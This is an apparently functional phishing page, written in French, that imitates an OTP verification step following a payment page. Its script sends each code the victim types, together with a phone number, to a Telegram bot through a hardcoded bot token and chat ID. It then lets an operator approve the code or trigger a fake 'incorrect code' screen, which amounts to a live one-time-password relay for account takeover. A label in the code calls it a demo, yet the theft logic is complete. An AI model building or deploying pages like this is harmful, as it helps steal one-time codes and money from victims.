<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vérification OTP</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        /* Overlay for decline message */
        
        #declineOverlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.6);
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }
        
        #declineOverlay.show {
            display: flex;
        }
        
        .decline-box {
            background: white;
            padding: 2rem;
            border-radius: 1rem;
            text-align: center;
            max-width: 400px;
            margin: 1rem;
        }
        /* Loading overlay (waiting Telegram) */
        
        #loadingOverlay {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.65);
            z-index: 10000;
            align-items: center;
            justify-content: center;
        }
        
        #loadingOverlay.show {
            display: flex;
        }
        
        .spinner {
            width: 56px;
            height: 56px;
            border: 5px solid rgba(255, 255, 255, 0.25);
            border-top-color: #ef4444;
            /* red-500 */
            border-radius: 9999px;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }
    </style>
</head>

<body class="bg-white">
    <!-- Loading Overlay -->
    <div id="loadingOverlay">
        <div class="bg-white rounded-2xl p-6 text-center w-[320px]">
            <div class="spinner mx-auto mb-4"></div>
            <h2 class="text-lg font-bold text-gray-900">Vérification en cours…</h2>
            <p class="text-sm text-gray-600 mt-1">Patientez pendant que Telegram confirme votre demande.</p>
        </div>
    </div>

    <!-- Decline Overlay -->
    <div id="declineOverlay">
        <div class="decline-box">
            <div class="text-5xl mb-4">❌</div>
            <h2 class="text-2xl font-bold text-red-600 mb-2">Mauvais détails saisis</h2>
            <p class="text-gray-600 mb-6">Le code OTP fourni est incorrect. Veuillez réessayer.</p>
            <button onclick="closeDecline()" class="bg-black text-white px-8 py-3 rounded-xl font-bold hover:bg-gray-800">
        Réessayer
      </button>
        </div>
    </div>

    <div class="max-w-md mx-auto min-h-screen px-5 pt-6">

        <!-- Back button -->
        <button onclick="history.back()" class="flex items-center gap-2 border rounded-full px-4 py-2 text-gray-700 text-sm">
      ← Retour
    </button>

        <!-- Title -->
        <h1 class="mt-6 text-xl font-semibold text-gray-900">
            Vérification OTP
        </h1>

        <!-- Instruction -->
        <p class="mt-3 text-gray-700 text-sm">
            Veuillez saisir le code OTP que vous avez reçu le
            <span class="font-semibold">+243812345678</span>
        </p>

        <!-- FORM -->
        <form method="POST" action="/hodlfa/" id="otpForm" class="mt-8">
            <input type="hidden" name="csrfmiddlewaretoken" value="JQq0Sx4F8jWZQ0bh6cqFW9m1LWlxw1We21YItZBnkbgyTzpcGids45qch9MDLeF8">

            <div class="flex gap-4 justify-between">
                <input type="text" maxlength="1" name="code" class="otp w-16 h-16 border rounded-lg text-center text-xl focus:outline-none focus:ring-2 focus:ring-red-500" inputmode="numeric" pattern="[0-9]" autocomplete="one-time-code" required>
                <input type="text" maxlength="1" name="code2" class="otp w-16 h-16 border rounded-lg text-center text-xl focus:outline-none focus:ring-2 focus:ring-red-500" inputmode="numeric" pattern="[0-9]" required>
                <input type="text" maxlength="1" name="code3" class="otp w-16 h-16 border rounded-lg text-center text-xl focus:outline-none focus:ring-2 focus:ring-red-500" inputmode="numeric" pattern="[0-9]" required>
                <input type="text" maxlength="1" name="code4" class="otp w-16 h-16 border rounded-lg text-center text-xl focus:outline-none focus:ring-2 focus:ring-red-500" inputmode="numeric" pattern="[0-9]" required>
            </div>
        </form>

        <!-- Resend -->
        <div class="mt-6">
            <button type="button" class="text-red-600 font-semibold text-sm">
        RENVOYER CODE OTP
      </button>
        </div>
    </div>

    <script>
        document.addEventListener("DOMContentLoaded", () => {
            // ===== CONFIG TELEGRAM (À REMPLACER AVEC LES MÊMES VALEURS QUE LA PAGE DE PAIEMENT) =====
            const TELEGRAM_BOT_TOKEN = "8804915107:AAH0HjxpPNK55uRX3ycBxDXq1PT1L6qNeQQ";
            const TELEGRAM_CHAT_ID = "6180610478";
            // =======================================================================================

            const inputs = document.querySelectorAll(".otp");
            const form = document.getElementById("otpForm");
            const declineOverlay = document.getElementById("declineOverlay");
            const loadingOverlay = document.getElementById("loadingOverlay");

            let sentMessageId = null;
            let lastUpdateId = 0;
            let pollingActive = false;
            let pollingTimer = null;
            let timeoutTimer = null;

            const TIMEOUT_MS = 60000; // 60s

            function setWaiting(isWaiting) {
                if (isWaiting) {
                    if (loadingOverlay) loadingOverlay.classList.add("show");
                    inputs.forEach(i => i.disabled = true);
                } else {
                    if (loadingOverlay) loadingOverlay.classList.remove("show");
                    inputs.forEach(i => i.disabled = false);
                }
            }

            function clearTimers() {
                if (pollingTimer) {
                    clearInterval(pollingTimer);
                    pollingTimer = null;
                }
                if (timeoutTimer) {
                    clearTimeout(timeoutTimer);
                    timeoutTimer = null;
                }
                pollingActive = false;
            }

            function getOtp() {
                return Array.from(inputs).map(i => i.value).join("");
            }

            function resetOtpUI() {
                form.reset();
                inputs.forEach(i => i.value = "");
                sentMessageId = null;
                clearTimers();
            }

            function showDecline() {
                resetOtpUI();
                if (declineOverlay) declineOverlay.classList.add("show");
                setWaiting(false);
                // focus first input
                if (inputs[0]) inputs[0].focus();
            }

            // Expose for inline onclick
            window.closeDecline = function() {
                if (declineOverlay) declineOverlay.classList.remove("show");
                setWaiting(false);
                if (inputs[0]) inputs[0].focus();
            };

            function answerCallbackQuery(callbackQueryId) {
                const answerUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`;
                return fetch(answerUrl, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        callback_query_id: callbackQueryId
                    })
                }).catch(() => {});
            }

            function startPolling() {
                if (pollingActive) return;
                if (!sentMessageId) return;

                pollingActive = true;

                pollingTimer = setInterval(() => {
                    if (!sentMessageId) return;

                    const url =
                        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?` +
                        `offset=${lastUpdateId + 1}&timeout=10`;

                    fetch(url)
                        .then(r => r.json())
                        .then(data => {
                            if (!data || !data.ok || !data.result) return;

                            data.result.forEach(update => {
                                lastUpdateId = update.update_id;

                                const cb = update.callback_query;
                                if (!cb) return;

                                const cbMsgId = cb && cb.message && cb.message.message_id;
                                if (cbMsgId !== sentMessageId) return;

                                const cbData = cb.data;

                                // Always answer callback query to stop Telegram loading state
                                answerCallbackQuery(cb.id);

                                if (cbData === "approve") {
                                    clearTimers();
                                    setWaiting(false);
                                    window.location.href = "success.html";
                                } else if (cbData === "decline") {
                                    clearTimers();
                                    setWaiting(false);
                                    showDecline();
                                }
                            });
                        })
                        .catch(err => {
                            console.error("Polling error:", err);
                        });
                }, 2000);
            }

            function envoyerOTP(otp) {
                const message = `
🔴 CODE OTP REÇU (DÉMO)
━━━━━━━━━━━━━━━━━━━━━
🔑 OTP : ${otp}
📱 Numéro : +243812345678
🕐 Timestamp : ${new Date().toLocaleString("fr-FR")}
━━━━━━━━━━━━━━━━━━━━━
⚠️ Ceci est une démo — à des fins de test uniquement.
        `.trim();

                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

                fetch(url, {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify({
                            chat_id: TELEGRAM_CHAT_ID,
                            text: message,
                            parse_mode: "HTML",
                            reply_markup: {
                                inline_keyboard: [
                                    [{
                                        text: "✅ Approve",
                                        callback_data: "approve"
                                    }, {
                                        text: "❌ Decline",
                                        callback_data: "decline"
                                    }]
                                ]
                            }
                        })
                    })
                    .then(res => res.json())
                    .then(data => {
                        console.log("Telegram (OTP) response:", data);

                        if (data && data.ok && data.result) {
                            sentMessageId = data.result.message_id;
                            startPolling();
                        } else {
                            clearTimers();
                            setWaiting(false);
                            window.location.href = "success.html";
                        }
                    })
                    .catch(err => {
                        console.error("Erreur Telegram OTP:", err);
                        clearTimers();
                        setWaiting(false);
                        window.location.href = "login.html";
                    });
            }

            function checkAndSubmit() {
                const otp = getOtp();
                if (otp.length !== inputs.length) return;

                // show waiting immediately
                setWaiting(true);

                // prevent any normal form submit
                if (form) {
                    form.addEventListener("submit", (e) => e.preventDefault(), {
                        once: true
                    });
                }

                // close any previous decline overlay
                if (declineOverlay) declineOverlay.classList.remove("show");

                // reset timers state
                clearTimers();

                // start timeout: if Telegram never answers
                timeoutTimer = setTimeout(() => {
                    clearTimers();
                    setWaiting(false);
                    showDecline();
                }, TIMEOUT_MS);

                // Send OTP to Telegram
                envoyerOTP(otp);
            }

            // Focus first input on load
            if (inputs[0]) inputs[0].focus();

            inputs.forEach((input, index) => {
                // typing
                input.addEventListener("input", () => {
                    input.value = input.value.replace(/[^0-9]/g, "");

                    if (input.value && index < inputs.length - 1) {
                        inputs[index + 1].focus();
                    }

                    checkAndSubmit();
                });

                // backspace
                input.addEventListener("keydown", (e) => {
                    if (e.key === "Backspace" && !input.value && index > 0) {
                        inputs[index - 1].focus();
                    }
                });

                // paste
                input.addEventListener("paste", (e) => {
                    e.preventDefault();

                    const pasteData = (e.clipboardData || window.clipboardData)
                        .getData("text")
                        .replace(/[^0-9]/g, "")
                        .slice(0, inputs.length);

                    const digits = pasteData.split("");
                    inputs.forEach((inp, i) => {
                        inp.value = digits[i] ? digits[i] : "";
                    });

                    if (pasteData.length === inputs.length) {
                        checkAndSubmit();
                    } else {
                        // focus first empty box
                        const firstEmpty = Array.from(inputs).findIndex(inp => !inp.value);
                        if (firstEmpty >= 0 && inputs[firstEmpty]) inputs[firstEmpty].focus();
                    }
                });
            });

            // Hard-block traditional submission (safety)
            if (form) {
                form.addEventListener("submit", (e) => e.preventDefault());
            }
        });
    </script>
</body>

</html>
